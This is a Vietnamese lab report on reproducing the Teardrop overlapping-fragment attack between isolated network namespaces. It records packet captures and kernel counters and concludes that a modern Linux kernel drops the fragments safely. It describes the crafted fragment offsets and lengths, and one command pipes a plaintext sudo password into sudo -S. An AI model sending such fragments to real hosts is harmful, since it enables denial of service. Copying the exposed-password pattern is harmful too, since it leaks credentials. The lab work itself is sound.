# BÁO CÁO KẾT QUẢ THỰC NGHIỆM: LAB 06
## Teardrop Attack (IP Fragmentation Overlap) & Modern Kernel Defense

- **Thời gian thực thi:** 2026-11-08 (Kali VM Local Time: 01:11)
- **Hệ điều hành kiểm thử:** Kali Linux (`7.1.5+kali-amd64`, x86_64) trên nền tảng VMware
- **Môi trường ảo hóa mạng:** Linux Network Namespaces (`h1` - Attacker `10.0.0.1/24`, `h2` - Victim `10.0.0.2/24`) nối qua cặp Virtual Ethernet `veth1 <-> veth2`.
- **Công cụ:** Scapy 2.6.1, tcpdump 4.99.5, `/proc/net/snmp`, dmesg

---

### 1. RAW TERMINAL OUTPUTS (Minh Chứng Thực Tế)

#### 1.1. Khởi tạo Topology & Baseline Connectivity

Lệnh thực thi:
```bash
echo Aa@123456 | sudo -S bash /tmp/lab06/setup_pair.sh
```

Terminal Output:
```text
[*] Cleaning up old network namespaces and bridges...
[*] Creating network namespaces h1 (Attacker) and h2 (Victim)...
[*] Creating veth pair (veth1 <-> veth2)...
[*] Configuring IP addresses and bringing up interfaces...
[+] Verifying baseline ping connectivity between h1 and h2:
PING 10.0.0.2 (10.0.0.2) 56(84) bytes of data.
64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=0.201 ms
64 bytes from 10.0.0.2: icmp_seq=2 ttl=64 time=0.086 ms

--- 10.0.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1009ms
rtt min/avg/max/mdev = 0.086/0.143/0.201/0.057 ms
[+] Setup completed successfully. Topology:
    - h1 (Attacker): 10.0.0.1/24 (veth1)
    - h2 (Victim)  : 10.0.0.2/24 (veth2)
```

---

#### 1.2. Thống Kê SNMP Tái Hợp Mảnh Trước Tấn Công (`snmp_before.log`)

```text
Ip: Forwarding DefaultTTL InReceives InHdrErrors InAddrErrors ForwDatagrams InUnknownProtos InDiscards InDelivers OutRequests OutDiscards OutNoRoutes ReasmTimeout ReasmReqds ReasmOKs ReasmFails FragOKs FragFails FragCreates OutTransmits
Ip: 2 64 2 0 0 0 0 0 2 2 0 0 0 0 0 0 0 0 0 2
```

> **Ghi nhận ban đầu:** `ReasmReqds = 0`, `ReasmOKs = 0`, `ReasmFails = 0`. Chưa có gói phân mảnh nào cần xử lý.

---

#### 1.3. Bắt Gói Mảnh Chồng Lấn trên Nạn Nhân (`tcpdump_h2_frag.log`)

Lệnh thực thi:
```bash
ip netns exec h2 timeout 8 tcpdump -i veth2 -nn -v ip > /tmp/lab06/tcpdump_h2_frag.log 2>&1 &
ip netns exec h2 ping -i 0.3 -c 10 10.0.0.1 > /tmp/lab06/ping_health.log 2>&1 &
ip netns exec h1 python3 /tmp/lab06/teardrop.py
```

Output script `teardrop.py`:
```text
[*] Crafting Teardrop overlapping IP fragments:
    - Target IP : 10.0.0.2
    - IP ID     : 1234
    - Fragment 1: frag=0, flags=MF, payload_len=24 (bytes 0..23)
    - Fragment 2: frag=1 (offset 8), flags=0, payload_len=24 (bytes 8..31)
    - Overlap Range: bytes 8..23 (16 bytes)
[+] Sent 2 overlapping IP fragments (Teardrop ID=1234) to 10.0.0.2
```

Log `tcpdump` tại `veth2`:
```text
tcpdump: listening on veth2, link-type EN10MB (Ethernet), snapshot length 262144 bytes
01:11:19.047488 IP (tos 0x0, ttl 64, id 7815, offset 0, flags [DF], proto ICMP (1), length 84)
    10.0.0.2 > 10.0.0.1: ICMP echo request, id 62070, seq 2, length 64
01:11:19.047532 IP (tos 0x0, ttl 64, id 36055, offset 0, flags [none], proto ICMP (1), length 84)
    10.0.0.1 > 10.0.0.2: ICMP echo reply, id 62070, seq 2, length 64
...
01:11:20.463467 IP (tos 0x0, ttl 64, id 1234, offset 0, flags [+], proto UDP (17), length 44)
    10.0.0.1.16705 > 10.0.0.2.16705: UDP, length 16697
01:11:20.464362 IP (tos 0x0, ttl 64, id 1234, offset 8, flags [none], proto UDP (17), length 44)
    10.0.0.1 > 10.0.0.2: ip-proto-17
...
01:11:21.607308 IP (tos 0x0, ttl 64, id 36470, offset 0, flags [none], proto ICMP (1), length 84)
    10.0.0.1 > 10.0.0.2: ICMP echo reply, id 62070, seq 10, length 64

20 packets captured
20 packets received by filter
0 packets dropped by kernel
```

---

#### 1.4. Kiểm Tra Sức Sống Nạn Nhân (`ping_health.log`)

```text
PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.
64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.038 ms
64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.087 ms
64 bytes from 10.0.0.1: icmp_seq=3 ttl=64 time=0.050 ms
64 bytes from 10.0.0.1: icmp_seq=4 ttl=64 time=0.061 ms
64 bytes from 10.0.0.1: icmp_seq=5 ttl=64 time=0.059 ms
64 bytes from 10.0.0.1: icmp_seq=6 ttl=64 time=0.069 ms
64 bytes from 10.0.0.1: icmp_seq=7 ttl=64 time=0.116 ms
64 bytes from 10.0.0.1: icmp_seq=8 ttl=64 time=0.073 ms
64 bytes from 10.0.0.1: icmp_seq=9 ttl=64 time=0.070 ms
64 bytes from 10.0.0.1: icmp_seq=10 ttl=64 time=0.085 ms

--- 10.0.0.1 ping statistics ---
10 packets transmitted, 10 received, 0% packet loss, time 2876ms
rtt min/avg/max/mdev = 0.038/0.070/0.116/0.020 ms
```

> **Kết quả:** Nạn nhân hoàn toàn khỏe mạnh, 10/10 gói ping thành công trong suốt thời gian nhận mảnh độc hại (0% packet loss).

---

#### 1.5. Thống Kê SNMP Sau Tấn Công (`snmp_after.log`)

```text
Ip: Forwarding DefaultTTL InReceives InHdrErrors InAddrErrors ForwDatagrams InUnknownProtos InDiscards InDelivers OutRequests OutDiscards OutNoRoutes ReasmTimeout ReasmReqds ReasmOKs ReasmFails FragOKs FragFails FragCreates OutTransmits
Ip: 2 64 14 0 0 0 0 0 12 12 0 0 0 2 0 1 0 0 0 12
```

---

#### 1.6. Nhật Ký Kernel (`dmesg`)

```text
[ 6767.825730] br0: port 1(veth_vic) entered disabled state
[ 6767.827057] veth_vic (unregistering): left allmulticast mode
...
[ 6998.510050] veth2: entered promiscuous mode
[ 7000.198323] veth1: entered promiscuous mode
[ 7000.244341] veth1: left promiscuous mode
[ 7006.508050] veth2: left promiscuous mode
```

> Không có bất kỳ cảnh báo Kernel Panic, Oops hay Call Trace nào.

---

### 2. BÓC TÁCH & PHÂN TÍCH CHUYÊN SÂU LOG TERMINAL

#### 2.1. Giải Phẫu Log tcpdump

Hai dòng gói tin bắt được tại thời điểm `01:11:20`:
```text
01:11:20.463467 IP (tos 0x0, ttl 64, id 1234, offset 0, flags [+], proto UDP (17), length 44)
    10.0.0.1.16705 > 10.0.0.2.16705: UDP, length 16697
01:11:20.464362 IP (tos 0x0, ttl 64, id 1234, offset 8, flags [none], proto UDP (17), length 44)
    10.0.0.1 > 10.0.0.2: ip-proto-17
```

1. **Ý nghĩa của trường Offset:**
   - Trong Scapy, ta truyền `frag=1`. Trường `Fragment Offset` trong tiêu chuẩn IPv4 (RFC 791) có độ dài 13 bits và được đo theo đơn vị **8-byte blocks**.
   - Do đó, giá trị `frag = 1` trong header tương ứng với byte offset thực tế là $1 \times 8 = 8\text{ bytes}$. `tcpdump` giải mã và hiển thị chính xác `offset 8`.
2. **Ý nghĩa các cờ Flags:**
   - Mảnh 1 hiển thị `flags [+]`: Ký hiệu `[+]` đại diện cho cờ **MF = 1 (More Fragments)**. Điều này báo hiệu cho máy nhận biết rằng gói tin chưa kết thúc và vẫn còn các mảnh tiếp theo.
   - Mảnh 2 hiển thị `flags [none]`: Ký hiệu `[none]` đại diện cho cờ **MF = 0**, đồng thời **DF = 0 (Don't Fragment)**. Đây là mảnh cuối cùng của chuỗi phân mảnh mang `id 1234`.

#### 2.2. Phân Tích Toán Học Vùng Chồng Lấn (Overlap Calculation)

Sơ đồ biểu diễn vùng dữ liệu của hai mảnh:

```
Byte Offset: 0       8               23      31
             +-------+---------------+-------+
Mảnh 1 (f1): |       24 bytes (A)    |
             +-------+---------------+-------+
                     ^               ^
                     |<- 16 bytes  ->|
                     |   (CHỒNG LẤN) |
                     +---------------+-------+
Mảnh 2 (f2):         |       24 bytes (B)    |
                     +---------------+-------+
```

- **Mảnh 1:** Bắt đầu tại `offset = 0`, độ dài payload = $24\text{ bytes} \implies$ Chiếm dải byte `[0 .. 23]`.
- **Mảnh 2:** Bắt đầu tại `offset = 8`, độ dài payload = $24\text{ bytes} \implies$ Chiếm dải byte `[8 .. 31]`.
- **Vùng chồng lấn (Overlapping region):** Trùng lặp từ byte `8` đến byte `23` ($24 - 8 = 16\text{ bytes}$).
- **Nguyên nhân gây crash trên hệ điều hành cũ (CVE-1999-0015):**
  - Thuật toán tái hợp cũ tính toán độ dài dữ liệu cần copy cho mảnh tiếp theo bằng công thức:
    $$\text{count} = \text{end\_offset} - \text{current\_offset}$$
  - Khi kẻ tấn công gửi mảnh 2 với `offset` nhỏ hơn điểm kết thúc của mảnh 1 nhưng độ dài tổng thể lại bị điều chỉnh bất hợp lý, phép trừ số nguyên không dấu (unsigned integer underflow) biến độ dài thành một số dương khổng lồ ($\approx 4\text{ GB}$).
  - Lệnh `memcpy` sao chép vùng nhớ vượt quá kích thước bộ đệm kernel được cấp phát $\rightarrow$ Ghi đè cấu trúc điều khiển của nhân $\rightarrow$ **BSOD (Windows 95/NT)** hoặc **Kernel Panic (Linux < 2.0.32)**.

#### 2.3. Đối Chiếu Bảng Chỉ Số `/proc/net/snmp` (Trước vs. Sau)

| Chỉ số SNMP IPv4 | Trước Tấn Công (`snmp_before`) | Sau Tấn Công (`snmp_after`) | Biến Thiên ($\Delta$) | Phân Tích Ý Nghĩa Kỹ Thuật |
| :--- | :---: | :---: | :---: | :--- |
| `InReceives` | 2 | 14 | $+12$ | Nhận thêm 10 gói ICMP Ping + 2 mảnh Teardrop UDP. |
| `ReasmReqds` | **0** | **2** | **$+2$** | Kernel phát hiện đúng 2 mảnh IP mang cờ phân mảnh cần được đưa vào hàng đợi tái hợp (`ip_defrag`). |
| `ReasmOKs` | **0** | **0** | **$0$** | **0 gói nào được tái hợp thành công:** Kernel nhận diện mảnh bất thường nên từ chối ráp thành gói hoàn chỉnh. |
| `ReasmFails` | **0** | **1** | **$+1$** | **Tăng chính xác 1:** Hàm xử lý phân mảnh (`ip_frag_reasm`) phát hiện lỗi cấu trúc/timeout và hủy bỏ hàng đợi mảnh (drop packet). |

#### 2.4. Kết Luận về Cơ Chế Tự Bảo Vệ của Kernel Hiện Đại

- Trong Linux Kernel 6.x / 7.x, cấu trúc tái hợp IP sử dụng cây Red-Black (`rb-node`) và kiểm tra nghiêm ngặt biên dữ liệu (`inet_frag_queue`).
- Khi phát hiện một mảnh có offset nằm trong phạm vi của mảnh đã tồn tại, hàm `ip_frag_queue` cắt tỉa (trimming) phần chồng lấn hoặc hủy bỏ phiên tái hợp nếu phát hiện dữ liệu mâu thuẫn, ghi nhận trực tiếp vào biến đếm `IPSTATS_MIB_REASMFAILS`.
- Nạn nhân hoàn toàn miễn nhiễm trước Teardrop Attack mà không cần bất kỳ phần mềm tường lửa bổ sung nào.

---

### 3. KẾT LUẬN

Thực nghiệm LAB 06 đã tái hiện thành công gói tin phân mảnh chồng lấn Teardrop, chứng minh qua bắt gói `tcpdump` (`offset 0` vs `offset 8`), chỉ ra sự thay đổi chính xác của bộ đếm `ReasmFails` trong `/proc/net/snmp`, và xác nhận 100% tính ổn định của Linux Kernel hiện đại trước lỗ hổng kinh điển CVE-1999-0015.

